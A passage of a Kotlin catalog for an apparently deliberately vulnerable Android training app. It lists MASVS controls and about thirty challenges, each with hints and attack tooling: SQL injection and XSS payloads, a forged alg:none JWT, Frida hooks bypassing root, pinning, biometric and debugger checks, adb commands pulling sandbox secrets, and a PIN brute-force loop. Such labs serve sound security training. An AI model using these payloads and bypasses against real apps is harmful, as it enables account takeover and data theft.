package com.evilcorp.android.model

data class MasvsControl(
    val id: String,
    val title: String,
    val statement: String,
)

data class MasvsFamily(
    val code: String,
    val title: String,
    val controls: List<MasvsControl>,
)

/** Single source of truth for UI totals, scoring and tests. Keep ids stable. */
object ChallengeCatalog {
    val masvsFamilies: List<MasvsFamily> = listOf(
        MasvsFamily(
            code = "STORAGE",
            title = "Local Data Storage & Sandbox Hygiene",
            controls = listOf(
                MasvsControl(
                    "STORAGE-1",
                    "Secure Data Storage",
                    "The app securely stores sensitive data in credential storage or encrypted internal files.",
                ),
                MasvsControl(
                    "STORAGE-2",
                    "Data Leakage Prevention",
                    "The app prevents leakage of sensitive data via logs, backups, caches, external storage, or memory.",
                ),
            ),
        ),
        MasvsFamily(
            code = "CRYPTO",
            title = "Cryptography & Key Management",
            controls = listOf(
                MasvsControl(
                    "CRYPTO-1",
                    "Strong Cryptographic Primitives",
                    "The app employs current strong cryptography, random IVs/nonces, and CSPRNGs according to best practices.",
                ),
                MasvsControl(
                    "CRYPTO-2",
                    "Key Lifecycle & Keystore Protection",
                    "The app performs key management according to best practices using hardware-backed AndroidKeyStore.",
                ),
            ),
        ),
        MasvsFamily(
            code = "AUTH",
            title = "Authentication, Authorization & Biometrics",
            controls = listOf(
                MasvsControl(
                    "AUTH-1",
                    "Authentication & Token Protocols",
                    "The app uses secure authentication and authorization protocols and verifies signed tokens server-side.",
                ),
                MasvsControl(
                    "AUTH-2",
                    "Local & Biometric Authentication",
                    "The app performs local authentication securely using CryptoObject-bound BiometricPrompt and rate limits.",
                ),
                MasvsControl(
                    "AUTH-3",
                    "Step-Up Authentication",
                    "The app secures sensitive operations with step-up authentication bound to transaction parameters.",
                ),
            ),
        ),
        MasvsFamily(
            code = "NETWORK",
            title = "Network Communication & TLS Pinning",
            controls = listOf(
                MasvsControl(
                    "NETWORK-1",
                    "Secure TLS Channels",
                    "The app secures all network traffic using TLS with proper X509 certificate and hostname verification.",
                ),
                MasvsControl(
                    "NETWORK-2",
                    "Certificate Pinning",
                    "The app performs identity pinning for sensitive endpoints under the developer's control.",
                ),
            ),
        ),
        MasvsFamily(
            code = "PLATFORM",
            title = "Platform IPC, WebViews & UI Security",
            controls = listOf(
                MasvsControl(
                    "PLATFORM-1",
                    "Secure IPC & Component Exports",
                    "The app uses IPC mechanisms securely (Activities, ContentProviders, BroadcastReceivers, PendingIntents).",
                ),
                MasvsControl(
                    "PLATFORM-2",
                    "WebView Hardening",
                    "The app uses WebViews securely, disabling file:// access and untrusted JavaScript bridges.",
                ),
                MasvsControl(
                    "PLATFORM-3",
                    "Secure UI, Overlays & Task Stack",
                    "The app uses the user interface securely (FLAG_SECURE, tapjacking protection, isolated taskAffinity).",
                ),
            ),
        ),
        MasvsFamily(
            code = "CODE",
            title = "Code Quality, Memory Safety & Injection",
            controls = listOf(
                MasvsControl(
                    "CODE-2",
                    "Verified Dynamic Code Loading",
                    "The app enforces a mechanism that verifies the integrity of any dynamically loaded code.",
                ),
                MasvsControl(
                    "CODE-3",
                    "Memory-Safe Native Code",
                    "The app is free from memory corruption vulnerabilities in native JNI/C/C++ libraries.",
                ),
                MasvsControl(
                    "CODE-4",
                    "Input Validation & Safe Deserialization",
                    "The app validates and sanitizes untrusted inputs across SQL, archive paths, and object deserialization.",
                ),
            ),
        ),
        MasvsFamily(
            code = "RESILIENCE",
            title = "Reverse Engineering & Anti-Tampering",
            controls = listOf(
                MasvsControl(
                    "RESILIENCE-1",
                    "Environment & Root Integrity",
                    "The app validates the integrity of the platform (root and emulator detection).",
                ),
                MasvsControl(
                    "RESILIENCE-2",
                    "Anti-Tampering Controls",
                    "The app implements anti-tampering mechanisms and server-backed entitlement verification.",
                ),
                MasvsControl(
                    "RESILIENCE-3",
                    "Signing & Origin Verification",
                    "The app statically and dynamically verifies its signing certificate and installer origin.",
                ),
                MasvsControl(
                    "RESILIENCE-4",
                    "Anti-Dynamic Analysis",
                    "The app implements anti-debugging and anti-instrumentation techniques.",
                ),
            ),
        ),
        MasvsFamily(
            code = "PRIVACY",
            title = "User Privacy, Identifiers & Redaction",
            controls = listOf(
                MasvsControl(
                    "PRIVACY-2",
                    "Notification & Lockscreen Privacy",
                    "The app redacts sensitive data from public notifications and system surfaces.",
                ),
                MasvsControl(
                    "PRIVACY-3",
                    "Minimal Device Fingerprinting",
                    "The app does not harvest non-resettable hardware identifiers or track users without consent.",
                ),
            ),
        ),
    )

    val all: List<Challenge> = listOf(
        Challenge(
            id = "prefs", title = "SharedPreferences Storage",
            description = "Session secrets written to SharedPreferences in plaintext.",
            difficulty = Difficulty.Easy, area = Area.Storage,
            cwe = "CWE-312", masvs = "STORAGE-1", maswe = "MASWE-0006", mastg = "MASTG-TEST-0001", cvss = "5.0 (Medium)",
            hints = listOf(
                "Android keeps SharedPreferences as XML files inside the app sandbox.",
                "Look under /data/data/com.evilcorp.android/shared_prefs/.",
                "On a debuggable build: adb shell run-as com.evilcorp.android cat shared_prefs/evilcorp_session.xml",
            ),
            tooling = "adb shell run-as com.evilcorp.android ls shared_prefs\n" +
                "adb shell run-as com.evilcorp.android cat shared_prefs/evilcorp_session.xml\n\n" +
                "// Frida: log every SharedPreferences write\n" +
                "Java.perform(() => {\n" +
                "  const E = Java.use('android.app.SharedPreferencesImpl\$EditorImpl');\n" +
                "  E.putString.implementation = function (k, v) { console.log(k + ' = ' + v); return this.putString(k, v); };\n" +
                "});",
        ),
        Challenge(
            id = "sqli", title = "SQLite Injection",
            description = "Login query built by string concatenation against a local SQLite database.",
            difficulty = Difficulty.Medium, area = Area.Code,
            cwe = "CWE-89", masvs = "CODE-4", maswe = "MASWE-0079", mastg = "MASTG-TEST-0025", cvss = "7.5 (High)",
            hints = listOf(
                "The query is SELECT username, role, note FROM users WHERE username='…' AND password='…'.",
                "Try closing the quote yourself: ' OR 1=1 --",
                "You want the admin row: ' OR role='admin' --",
            ),
            tooling = "// Frida: print every SQL statement\n" +
                "Java.perform(() => {\n" +
                "  const DB = Java.use('android.database.sqlite.SQLiteDatabase');\n" +
                "  DB.rawQuery.overload('java.lang.String', '[Ljava.lang.String;').implementation = function (q, a) {\n" +
                "    console.log('SQL: ' + q); return this.rawQuery(q, a);\n" +
                "  };\n" +
                "});",
        ),
        Challenge(
            id = "secrets", title = "Hardcoded Secrets",
            description = "An API key compiled into the APK gates a privileged endpoint.",
            difficulty = Difficulty.Medium, area = Area.Crypto,
            cwe = "CWE-798", masvs = "CRYPTO-2", maswe = "MASWE-0005", mastg = "MASTG-TEST-0013", cvss = "7.5 (High)",
            hints = listOf(
                "The key never leaves the device, so it must be inside the APK.",
                "Decompile with jadx or run `apktool d` and grep for 'key'.",
                "The key is Base64-encoded in HardcodedSecretsLab.kt, decode it.",
            ),
            tooling = "apktool d app-debug.apk -o out && grep -ri 'EC_API' out/smali*\n" +
                "jadx -d out-jadx app-debug.apk   # open HardcodedSecretsLab\n" +
                "echo '<base64>' | base64 -d",
        ),
        Challenge(
            id = "logging", title = "Insecure Logging",
            description = "Credentials and a session token are written to logcat.",
            difficulty = Difficulty.Easy, area = Area.Storage,
            cwe = "CWE-532", masvs = "STORAGE-2", maswe = "MASWE-0001", mastg = "MASTG-TEST-0003", cvss = "5.0 (Medium)",
            hints = listOf(
                "Press Login, then look at the system log, not the screen.",
                "adb logcat | grep EvilCorpAuth",
                "The token field in the log line is the flag.",
            ),
            tooling = "adb logcat -c && adb logcat -s EvilCorpAuth:D\n" +
                "adb logcat --pid=\$(adb shell pidof com.evilcorp.android)",
        ),
        Challenge(
            id = "crypto", title = "Broken Cryptography",
            description = "AES-ECB with a key hardcoded in the app protects the vault blob.",
            difficulty = Difficulty.Medium, area = Area.Crypto,
            cwe = "CWE-327", masvs = "CRYPTO-1", maswe = "MASWE-0020", mastg = "MASTG-TEST-0014", cvss = "7.4 (High)",
            hints = listOf(
                "Identical plaintext blocks encrypt to identical ciphertext blocks in ECB mode.",
                "Find the 16-byte key in BrokenCryptoLab.kt (jadx).",
                "Decrypt the Base64 blob with AES/ECB/PKCS5Padding using that key.",
            ),
            tooling = "echo '<blob>' | base64 -d | openssl enc -d -aes-128-ecb -K \$(printf '<key>' | xxd -p)\n\n" +
                "// Frida: capture keys passed to javax.crypto\n" +
                "Java.perform(() => {\n" +
                "  const S = Java.use('javax.crypto.spec.SecretKeySpec');\n" +
                "  S.\$init.overload('[B', 'java.lang.String').implementation = function (k, a) {\n" +
                "    console.log(a + ' key=' + Java.use('java.lang.String').\$new(k)); return this.\$init(k, a);\n" +
                "  };\n" +
                "});",
        ),
        Challenge(
            id = "random", title = "Weak Random Generation",
            description = "A password-reset token comes from java.util.Random seeded with a leaked timestamp.",
            difficulty = Difficulty.Medium, area = Area.Crypto,
            cwe = "CWE-338", masvs = "CRYPTO-1", maswe = "MASWE-0027", mastg = "MASTG-TEST-0016", cvss = "7.5 (High)",
            hints = listOf(
                "java.util.Random is a deterministic LCG: same seed, same output.",
                "The 'requested at' epoch second is the seed.",
                "token = java.util.Random(seed).nextLong().toString(36)",
            ),
            tooling = "// jshell or Kotlin script\n" +
                "jshell> new java.util.Random(<epochSeconds>L).nextLong()\n" +
                "jshell> Long.toString(new java.util.Random(<epochSeconds>L).nextLong(), 36)",
        ),
        Challenge(
            id = "webview", title = "WebView JavaScript Bridge",
            description = "Unsanitized HTML is rendered in a WebView that exposes a native JS interface.",
            difficulty = Difficulty.Medium, area = Area.Platform,
            cwe = "CWE-79", masvs = "PLATFORM-2", maswe = "MASWE-0068", mastg = "MASTG-TEST-0032", cvss = "8.1 (High)",
            hints = listOf(
                "Your input is placed into the page without encoding, so HTML and script run.",
                "A Java object is exposed to JavaScript under the name EvilBridge.",
                "<script>document.body.innerText = EvilBridge.getFlag()</script>",
            ),
            tooling = "// Inject:\n<script>document.body.innerText = EvilBridge.getFlag()</script>\n\n" +
                "// Inspect via chrome://inspect (WebView debugging is enabled in this lab)\n" +
                "adb forward tcp:9222 localabstract:webview_devtools_remote_\$(adb shell pidof com.evilcorp.android)",
        ),
        Challenge(
            id = "provider", title = "Exported ContentProvider",
            description = "A ContentProvider is exported without permissions and returns internal notes.",
            difficulty = Difficulty.Medium, area = Area.Platform,
            cwe = "CWE-926", masvs = "PLATFORM-1", maswe = "MASWE-0063", mastg = "MASTG-TEST-0029", cvss = "7.5 (High)",
            hints = listOf(
                "Check AndroidManifest.xml for android:exported=\"true\" on <provider>.",
                "The authority is com.evilcorp.android.notes.",
                "adb shell content query --uri content://com.evilcorp.android.notes/notes",
            ),
            tooling = "adb shell content query --uri content://com.evilcorp.android.notes/notes\n" +
                "adb shell dumpsys package com.evilcorp.android | grep -A3 -i provider\n" +
                "drozer console connect  ->  run app.provider.info -a com.evilcorp.android",
        ),
        Challenge(
            id = "deeplink", title = "Deep Link Abuse",
            description = "An exported activity trusts parameters from the evilcorp:// URL scheme.",
            difficulty = Difficulty.Medium, area = Area.Platform,
            cwe = "CWE-939", masvs = "PLATFORM-1", maswe = "MASWE-0058", mastg = "MASTG-TEST-0028", cvss = "6.5 (Medium)",
            hints = listOf(
                "Find the <intent-filter> with the evilcorp scheme in the manifest.",
                "The handler supports a 'settings' host with a debug parameter.",
                "adb shell am start -a android.intent.action.VIEW -d \"evilcorp://settings?debug=1\"",
            ),
            tooling = "adb shell am start -a android.intent.action.VIEW -d \"evilcorp://settings?debug=1\"\n" +
                "adb shell am start -a android.intent.action.VIEW -d \"evilcorp://pay?to=attacker&amount=999\"",
        ),
        Challenge(
            id = "root", title = "Root Detection Bypass",
            description = "A client-side root check decides whether the secure area opens.",
            difficulty = Difficulty.Medium, area = Area.Resilience,
            cwe = "CWE-693", masvs = "RESILIENCE-1", maswe = "MASWE-0097", mastg = "MASTG-TEST-0046", cvss = "4.3 (Medium)",
            hints = listOf(
                "The lab plants a synthetic su binary so the check always fires.",
                "The decision is a single boolean returned by RootChecker.isRooted().",
                "Hook it with Frida and return false. The indicator is re-planted on every attempt.",
            ),
            tooling = "// Frida\n" +
                "Java.perform(() => {\n" +
                "  const R = Java.use('com.evilcorp.android.labs.RootChecker');\n" +
                "  R.isRooted.implementation = function (ctx) { return false; };\n" +
                "});\n\n" +
                "# or: objection -g com.evilcorp.android explore -> android root disable\n" +
                "# or: patch the APK (apktool d, edit smali, apktool b, apksigner)",
        ),
        Challenge(
            id = "cleartext", title = "Cleartext HTTP Session",
            description = "Credentials and a session token travel over unencrypted HTTP.",
            difficulty = Difficulty.Medium, area = Area.Network,
            cwe = "CWE-319", masvs = "NETWORK-1", maswe = "MASWE-0050", mastg = "MASTG-TEST-0019", cvss = "7.4 (High)",
            hints = listOf(
                "The manifest and network security config both permit cleartext traffic.",
                "Start the lab server, then forward its port to your computer.",
                "adb forward tcp:8080 tcp:8080 && curl -i -d 'user=alice&pass=wonderland' http://127.0.0.1:8080/login",
            ),
            tooling = "adb forward tcp:8080 tcp:8080\n" +
                "curl -i -d 'user=alice&pass=wonderland' http://127.0.0.1:8080/login\n" +
                "# look at the Set-Cookie header",
        ),
        Challenge(
            id = "external", title = "External Storage Leak",
            description = "A credentials backup is written to shared external storage.",
            difficulty = Difficulty.Easy, area = Area.Storage,
            cwe = "CWE-922", masvs = "STORAGE-2", maswe = "MASWE-0007", mastg = "MASTG-TEST-0002", cvss = "5.5 (Medium)",
            hints = listOf(
                "Files under external storage are not private to the app.",
                "Path: /sdcard/Android/data/com.evilcorp.android/files/",
                "adb pull /sdcard/Android/data/com.evilcorp.android/files/backup_credentials.txt",
            ),
            tooling = "adb shell ls /sdcard/Android/data/com.evilcorp.android/files/\n" +
                "adb pull /sdcard/Android/data/com.evilcorp.android/files/backup_credentials.txt",
        ),
        Challenge(
            id = "broadcast", title = "Unprotected Broadcast Receiver",
            description = "An exported receiver accepts privilege changes from any app.",
            difficulty = Difficulty.Hard, area = Area.Platform,
            cwe = "CWE-927", masvs = "PLATFORM-1", maswe = "MASWE-0064", mastg = "MASTG-TEST-0030", cvss = "7.8 (High)",
            hints = listOf(
                "Look for <receiver android:exported=\"true\"> and its intent-filter action.",
                "The receiver reads a string extra named role.",
                "adb shell am broadcast -a com.evilcorp.android.ACTION_PROMOTE --es role admin -n com.evilcorp.android/.labs.PromoteReceiver",
            ),
            tooling = "adb shell am broadcast -a com.evilcorp.android.ACTION_PROMOTE --es role admin \\\n" +
                "  -n com.evilcorp.android/.labs.PromoteReceiver",
        ),
        Challenge(
            id = "clipboard", title = "Clipboard Leakage",
            description = "A secret is copied to the system clipboard without the sensitive flag.",
            difficulty = Difficulty.Easy, area = Area.Platform,
            cwe = "CWE-200", masvs = "STORAGE-2", maswe = "MASWE-0053", mastg = "MASTG-TEST-0007", cvss = "4.0 (Medium)",
            hints = listOf(
                "Any foreground app (and keyboards, clipboard managers) can read the clipboard.",
                "Press Copy, then paste into the field below.",
                "Hook ClipboardManager.setPrimaryClip to observe what the app copies.",
            ),
            tooling = "// Frida\n" +
                "Java.perform(() => {\n" +
                "  const C = Java.use('android.content.ClipboardManager');\n" +
                "  C.setPrimaryClip.implementation = function (clip) {\n" +
                "    console.log(clip.getItemAt(0).getText()); return this.setPrimaryClip(clip);\n" +
                "  };\n" +
                "});",
        ),
        Challenge(
            id = "pin", title = "Vulnerable Vault PIN",
            description = "A 4-digit PIN checked client-side with an unsalted MD5 and no lockout.",
            difficulty = Difficulty.Hard, area = Area.Auth,
            cwe = "CWE-307", masvs = "AUTH-2", maswe = "MASWE-0036", mastg = "MASTG-TEST-0018", cvss = "6.8 (Medium)",
            hints = listOf(
                "There are only 10,000 possible PINs and the app never rate-limits attempts.",
                "The expected hash is embedded in PinVaultLab.kt, MD5 of the PIN.",
                "Brute-force offline: for i in 0000..9999, compare md5(i) with the embedded hash.",
            ),
            tooling = "for i in \$(seq -w 0 9999); do\n" +
                "  [ \"\$(printf \$i | md5)\" = \"88cf91a1aef212f3c2cd12406983427d\" ] && echo PIN=\$i && break\n" +
                "done",
        ),
        Challenge(
            id = "screenshot", title = "Screenshot Leakage",
            description = "A sensitive screen can be captured because FLAG_SECURE is not set.",
            difficulty = Difficulty.Easy, area = Area.Platform,
            cwe = "CWE-200", masvs = "PLATFORM-3", maswe = "MASWE-0055", mastg = "MASTG-TEST-0009", cvss = "4.0 (Medium)",
            hints = listOf(
                "Without FLAG_SECURE the OS lets screenshots, screen recording and the recents thumbnail see the content.",
                "The flag is masked on screen. Capture the screen after pressing Reveal.",
                "adb exec-out screencap -p > shot.png",
            ),
            tooling = "adb exec-out screencap -p > shot.png\n" +
                "adb shell screenrecord /sdcard/rec.mp4",
        ),
        Challenge(
            id = "keystore", title = "PKCS#12 Keystore Misuse",
            description = "A portable PKCS#12 file with a default password replaces AndroidKeyStore.",
            difficulty = Difficulty.Medium, area = Area.Crypto,
            cwe = "CWE-522", masvs = "CRYPTO-2", maswe = "MASWE-0013", mastg = "MASTG-TEST-0015", cvss = "6.8 (Medium)",
            hints = listOf(
                "Provision the store first; it writes files/vault.p12 inside the app sandbox.",
                "Inspect WeakKeystore in jadx to find KEYSTORE_PASS.",
                "Enter the default Java keystore password 'changeit' or pull vault.p12 via run-as.",
            ),
            tooling = "adb shell run-as com.evilcorp.android cat files/vault.p12 > vault.p12\n" +
                "keytool -list -v -keystore vault.p12 -storetype PKCS12 -storepass changeit",
        ),
        Challenge(
            id = "backup", title = "Android Backup & Plaintext Files",
            description = "Plaintext sync credentials in filesDir exposed by android:allowBackup=\"true\".",
            difficulty = Difficulty.Easy, area = Area.Storage,
            cwe = "CWE-312", masvs = "STORAGE-2", maswe = "MASWE-0008", mastg = "MASTG-TEST-0008", cvss = "5.5 (Medium)",
            hints = listOf(
                "Press 'Write cloud sync config' to create the file in internal storage.",
                "Check files/cloud_sync_config.json inside the sandbox.",
                "adb shell run-as com.evilcorp.android cat files/cloud_sync_config.json",
            ),
            tooling = "adb shell run-as com.evilcorp.android cat files/cloud_sync_config.json\n" +
                "adb backup -f backup.ab com.evilcorp.android",
        ),
        Challenge(
            id = "sslpinning", title = "SSL Pinning Bypass",
            description = "Client-side SPKI certificate pinning enforced by a single boolean check.",
            difficulty = Difficulty.Hard, area = Area.Network,
            cwe = "CWE-295", masvs = "NETWORK-2", maswe = "MASWE-0047", mastg = "MASTG-TEST-0022", cvss = "5.9 (Medium)",
            hints = listOf(
                "SslPinValidator.verifyCertificatePin() compares the presented pin against EXPECTED_PIN.",
                "Find SslPinValidator.EXPECTED_PIN in jadx or hook verifyCertificatePin() in Frida.",
                "Expected pin: sha256/9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
            ),
            tooling = "// Frida\n" +
                "Java.perform(() => {\n" +
                "  const V = Java.use('com.evilcorp.android.labs.SslPinValidator');\n" +
                "  V.verifyCertificatePin.implementation = function (pin) { return true; };\n" +
                "});",
        ),
        Challenge(
            id = "webviewfile", title = "WebView Universal File Access",
            description = "WebView with allowFileAccess and allowUniversalAccessFromFileURLs reads sandbox files.",
            difficulty = Difficulty.Hard, area = Area.Platform,
            cwe = "CWE-200", masvs = "PLATFORM-2", maswe = "MASWE-0070", mastg = "MASTG-TEST-0033", cvss = "7.5 (High)",
            hints = listOf(
                "The lab writes a confidential note to files/internal_audit.txt on launch.",
                "The WebView allows loading file:// URLs directly.",
                "Load file:///data/data/com.evilcorp.android/files/internal_audit.txt",
            ),
            tooling = "# Enter in the WebView URL bar:\n" +
                "file:///data/data/com.evilcorp.android/files/internal_audit.txt",
        ),
        Challenge(
            id = "biometric", title = "Biometric Auth Bypass",
            description = "Event-bound biometric gate not tied to a Keystore CryptoObject.",
            difficulty = Difficulty.Hard, area = Area.Auth,
            cwe = "CWE-287", masvs = "AUTH-2", maswe = "MASWE-0033", mastg = "MASTG-TEST-0017", cvss = "7.1 (High)",
            hints = listOf(
                "The vault checks BiometricGate.isBiometricVerified() without decrypting via Keystore.",
                "Hook BiometricGate.isBiometricVerified() with Frida to return true, or check QA_PROP in jadx.",
                "adb shell setprop debug.evilcorp.bio_override true",
            ),
            tooling = "// Frida\n" +
                "Java.perform(() => {\n" +
                "  const B = Java.use('com.evilcorp.android.labs.BiometricGate');\n" +
                "  B.isBiometricVerified.implementation = function () { return true; };\n" +
                "});\n\n" +
                "# or exploit the leftover QA system property:\n" +
                "adb shell setprop debug.evilcorp.bio_override true",
        ),
        Challenge(
            id = "antidebug", title = "Debugger & Frida Detection",
            description = "Telemetry key gated behind Debug.isDebuggerConnected, FLAG_DEBUGGABLE and TracerPid.",
            difficulty = Difficulty.Hard, area = Area.Resilience,
            cwe = "CWE-693", masvs = "RESILIENCE-4", maswe = "MASWE-0104", mastg = "MASTG-TEST-0049", cvss = "4.3 (Medium)",
            hints = listOf(
                "AntiDebugCheck.isBeingDebugged() triggers because the training APK is debuggable.",
                "Hook isBeingDebugged() in Frida to return false, or inspect QA_BYPASS_PROP in AntiDebugLab.kt.",
                "adb shell setprop debug.evilcorp.allow_debug 1",
            ),
            tooling = "// Frida\n" +
                "Java.perform(() => {\n" +
                "  const A = Java.use('com.evilcorp.android.labs.AntiDebugCheck');\n" +
                "  A.isBeingDebugged.implementation = function (ctx) { return false; };\n" +
                "});\n\n" +
                "# or set the QA property discovered in jadx:\n" +
                "adb shell setprop debug.evilcorp.allow_debug 1",
        ),
        Challenge(
            id = "keyboard", title = "Keyboard & IME Cache Leak",
            description = "Predictive text caches sensitive recovery phrases in a personalized dictionary.",
            difficulty = Difficulty.Easy, area = Area.Storage,
            cwe = "CWE-200", masvs = "PLATFORM-3", maswe = "MASWE-0054", mastg = "MASTG-TEST-0006", cvss = "4.3 (Medium)",
            hints = listOf(
                "Press 'Sync IME learned dictionary' to write the personalized suggestion cache.",
                "Look for ime_learned_words.txt inside the app's files/ directory.",
                "adb shell run-as com.evilcorp.android cat files/ime_learned_words.txt",
            ),
            tooling = "adb shell run-as com.evilcorp.android cat files/ime_learned_words.txt",
        ),
        Challenge(
            id = "tampering", title = "Bytecode Tampering & Licensing",
            description = "Enterprise feature flag gated by an XOR license check in IntegrityGate.",
            difficulty = Difficulty.Hard, area = Area.Resilience,
            cwe = "CWE-353", masvs = "RESILIENCE-2", maswe = "MASWE-0100", mastg = "MASTG-TEST-0047", cvss = "5.3 (Medium)",
            hints = listOf(
                "Decompile IntegrityGate in TamperingLab.kt and inspect MASKED.",
                "Each integer in MASKED is XORed with 0x5A to form the license string.",
                "The decoded license key is EC-ENT-2026-PRO (or hook verifyLicense() to return true).",
            ),
            tooling = "python3 -c 'm=[0x1F,0x19,0x77,0x1F,0x14,0x0E,0x77,0x68,0x6A,0x68,0x6C,0x77,0x0A,0x08,0x15];print(\"\".join(chr(x^0x5A) for x in m))'\n\n" +
                "// Frida\n" +
                "Java.perform(() => {\n" +
                "  Java.use('com.evilcorp.android.labs.IntegrityGate').verifyLicense.implementation = () => true;\n" +
                "});",
        ),
        Challenge(
            id = "httpcache", title = "HTTP Disk Cache Leak",
            description = "Authenticated API responses are cached unencrypted under cache/http_cache/.",
            difficulty = Difficulty.Medium, area = Area.Network,
            cwe = "CWE-524", masvs = "STORAGE-2", maswe = "MASWE-0009", mastg = "MASTG-TEST-0004", cvss = "5.5 (Medium)",
            hints = listOf(
                "Press 'Fetch /v1/account/statement' to populate the HTTP disk cache.",
                "The UI redacts audit_token, but the raw response is stored under cache/http_cache/.",
                "adb shell run-as com.evilcorp.android cat cache/http_cache/entry_statement_v1.0",
            ),
            tooling = "adb shell run-as com.evilcorp.android ls -la cache/http_cache/\n" +
                "adb shell run-as com.evilcorp.android cat cache/http_cache/entry_statement_v1.0",
        ),
        Challenge(
            id = "pendingintent", title = "Mutable PendingIntent Hijack",
            description = "An implicit base Intent wrapped with FLAG_MUTABLE lets receivers hijack execution.",
            difficulty = Difficulty.Hard, area = Area.Platform,
            cwe = "CWE-927", masvs = "PLATFORM-1", maswe = "MASWE-0065", mastg = "MASTG-TEST-0034", cvss = "7.8 (High)",
            hints = listOf(
                "Press 'Broadcast mutable PendingIntent' or trigger PendingIntentHijackReceiver via adb.",
                "The receiver listens for com.evilcorp.android.ACTION_DISPATCH_PI.",
                "Press 'Broadcast mutable PendingIntent', then 'Refresh capture log' (or check logcat EvilCorpPI).",
            ),
            tooling = "adb logcat -s EvilCorpPI:W\n" +
                "adb shell am broadcast -a com.evilcorp.android.ACTION_DISPATCH_PI \\\n" +
                "  --es hijack_mode hijack -n com.evilcorp.android/.labs.PendingIntentHijackReceiver",
        ),
        Challenge(
            id = "tapjacking", title = "Tapjacking / Obscured Touch",
            description = "Sensitive approval button accepts touches when covered by an overlay window.",
            difficulty = Difficulty.Medium, area = Area.Platform,
            cwe = "CWE-1021", masvs = "PLATFORM-3", maswe = "MASWE-0056", mastg = "MASTG-TEST-0035", cvss = "6.1 (Medium)",
            hints = listOf(
                "Keep 'Simulated bait overlay: ON' and 'filterTouchesWhenObscured: OFF'.",
                "Tap the green 'Tap Here to Claim Free Coffee' bait button.",
                "Now toggle 'filterTouchesWhenObscured: ON' to see how Android blocks the obscured touch.",
            ),
            tooling = "// Verify in layouts or View code:\n" +
                "view.filterTouchesWhenObscured = true\n" +
                "window.setHideOverlayWindows(true) // API 31+",
        ),
        Challenge(
            id = "memory", title = "Sensitive Data in Heap Memory",
            description = "Clearing the UI leaves the master secret in an immutable String on the JVM heap.",
            difficulty = Difficulty.Hard, area = Area.Storage,
            cwe = "CWE-316", masvs = "STORAGE-2", maswe = "MASWE-0004", mastg = "MASTG-TEST-0011", cvss = "6.2 (Medium)",
            hints = listOf(
                "Press '1. Load secret into memory', then '2. Lock & Clear Screen'.",
                "Dump the Java heap with `adb shell am dumpheap` or read MemoryVault.retainedHeapSecret.",
                "adb shell am dumpheap com.evilcorp.android /data/local/tmp/ec.hprof && adb pull /data/local/tmp/ec.hprof && strings ec.hprof | grep HEAP_MASTER_KEY",
            ),
            tooling = "adb shell am dumpheap com.evilcorp.android /data/local/tmp/ec.hprof\n" +
                "adb pull /data/local/tmp/ec.hprof && strings ec.hprof | grep HEAP_MASTER_KEY\n\n" +
                "// Frida\n" +
                "Java.perform(() => {\n" +
                "  console.log(Java.use('com.evilcorp.android.labs.MemoryVault').retainedHeapSecret.value);\n" +
                "});",
        ),
        Challenge(
            id = "intentredirect", title = "Intent Redirection",
            description = "An exported proxy activity launches non-exported internal activities via extras.",
            difficulty = Difficulty.Hard, area = Area.Platform,
            cwe = "CWE-940", masvs = "PLATFORM-1", maswe = "MASWE-0061", mastg = "MASTG-TEST-0027", cvss = "8.1 (High)",
            hints = listOf(
                "InternalAdminActivity has android:exported=\"false\" and cannot be started directly.",
                "IntentRedirectActivity is exported and reads a string extra named 'target_class'.",
                "adb shell am start -n com.evilcorp.android/.labs.IntentRedirectActivity --es target_class com.evilcorp.android.labs.InternalAdminActivity",
            ),
            tooling = "# Direct launch fails with SecurityException:\n" +
                "adb shell am start -n com.evilcorp.android/.labs.InternalAdminActivity\n\n" +
                "# Pivot via exported IntentRedirectActivity:\n" +
                "adb shell am start -n com.evilcorp.android/.labs.IntentRedirectActivity \\\n" +
                "  --es target_class com.evilcorp.android.labs.InternalAdminActivity",
        ),
        Challenge(
            id = "pathtraversal", title = "Zip Slip / Path Traversal",
            description = "Archive extraction joins paths without canonicalPath validation.",
            difficulty = Difficulty.Hard, area = Area.Code,
            cwe = "CWE-22", masvs = "CODE-4", maswe = "MASWE-0081", mastg = "MASTG-TEST-0043", cvss = "7.5 (High)",
            hints = listOf(
                "The importer writes to File(files/themes, entryName) without checking for '..'.",
                "The vault unlocks when files/admin_override.flag contains UNLOCK.",
                "Set filename to ../admin_override.flag and content to UNLOCK, then extract.",
            ),
            tooling = "# Filename:\n../admin_override.flag\n# Content:\nUNLOCK",
        ),
        Challenge(
            id = "jwt", title = "Insecure JWT & alg:none",
            description = "Client-side JWT authorization accepts unsigned alg:none tokens with forged admin claims.",
            difficulty = Difficulty.Medium, area = Area.Auth,
            cwe = "CWE-347", masvs = "AUTH-1", maswe = "MASWE-0031", mastg = "MASTG-TEST-0024", cvss = "8.2 (High)",
            hints = listOf(
                "JwtSessionVerifier.isAdminToken() decodes the JWT payload without verifying the signature.",
                "Change the payload role from \"employee\" to \"admin\" and Base64URL-encode it.",
                "Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJqLmRvZSIsInJvbGUiOiJhZG1pbiIsImRlcHQiOiJleGVjdXRpdmUifQ.",
            ),
            tooling = "python3 -c 'import base64;b=lambda s:base64.urlsafe_b64encode(s.encode()).decode().rstrip(\"=\");print(b(\"{\\\"alg\\\":\\\"none\\\",\\\"typ\\\":\\\"JWT\\\"}\")+\".\"+b(\"{\\\"sub\\\":\\\"j.doe\\\",\\\"role\\\":\\\"admin\\\"}\")+\".\")'",
        ),
        Challenge(
            id = "stepup", title = "Missing Step-Up Authentication",
            description = "High-value wire transfers skip FIDO2 step-up verification when channel is batch_internal.",
            difficulty = Difficulty.Hard, area = Area.Auth,
            cwe = "CWE-306", masvs = "AUTH-3", maswe = "MASWE-0038", mastg = "MASTG-TEST-0026", cvss = "7.7 (High)",
            hints = listOf(
                "Inspect StepUpAuthController.isStepUpSatisfied() in jadx.",
                "When channel equals TRUSTED_BATCH_CHANNEL, the OTP/FIDO2 check is bypassed.",
                "Set the Request channel field to batch_internal and authorize the wire.",
            ),
            tooling = "// Frida\n" +
                "Java.perform(() => {\n" +
                "  Java.use('com.evilcorp.android.labs.StepUpAuthController').isStepUpSatisfied.implementation = () => true;\n" +
                "});",
        ),
        Challenge(
            id = "trustmanager", title = "TrustAll X509TrustManager",
            description = "Custom TrustManager and HostnameVerifier accept self-signed MITM certificates.",
            difficulty = Difficulty.Medium, area = Area.Network,
